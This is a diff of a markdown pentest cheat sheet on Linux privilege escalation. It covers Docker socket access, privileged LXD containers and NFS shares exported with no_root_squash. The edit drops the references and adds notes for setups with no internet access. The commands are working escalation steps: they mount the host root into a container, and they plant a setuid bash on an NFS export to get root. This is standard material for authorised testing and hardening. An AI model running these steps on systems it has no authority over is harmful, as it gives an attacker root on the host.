@@ -1,8 +1,7 @@
 # Groups, containers, and NFS
 
-[← Linux quick reference](../03-linux-privesc.md)
-
-Check matching socket, daemon mode, export, or mount; group name alone is insufficient.
+## Check group / socket / daemon
+Group name alone is not enough: confirm the socket and rootful daemon.
 
 ```bash
 id
@@ -14,45 +13,40 @@ docker version 2>/dev/null
 lxc list 2>/dev/null
 ```
 
-Rootful Docker socket accessible:
-
+## Docker (rootful socket accessible)
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
+- Rootless Docker ≠ host root.
+- No internet: needs an `alpine` image already local (`docker images`).
 
-Accessible LXD daemon + suitable image:
-
+## LXD (daemon accessible)
 ```bash
+lxc image import ./alpine.tar.gz --alias alpine
 lxc init alpine c -c security.privileged=true
 lxc config device add c d disk source=/ path=/mnt
 lxc start c
 lxc exec c sh
 ```
-
-Rootless Docker ≠ host root.
+- Host filesystem is under `/mnt` inside the container.
+- Skip the `image import` if `lxc image list` already shows an image.
 
 ## NFS
-
 ```bash
 cat /etc/exports 2>/dev/null
 findmnt
-showmount -e <NFS-SERVER>
+showmount -e <IP>
 ```
 
-`no_root_squash` + writable export + client root + compatible Bash binary:
-
+`no_root_squash` + writable export + root on your client + compatible bash. On Kali:
 ```bash
 mkdir /mnt/x
-mount -o rw,vers=3 <NFS-SERVER>:/export /mnt/x
+mount -o rw,vers=3 <IP>:/export /mnt/x
 cp /bin/bash /mnt/x/rootbash
 chmod +s /mnt/x/rootbash
 ```
-
+On target:
 ```bash
 /export/rootbash -p
 ```
-
-## References
-
-- [NFS exports](https://man7.org/linux/man-pages/man5/exports.5.html)
-- [Docker daemon access](https://docs.docker.com/reference/cli/dockerd/)
+- Copy a bash that runs on the target's glibc.
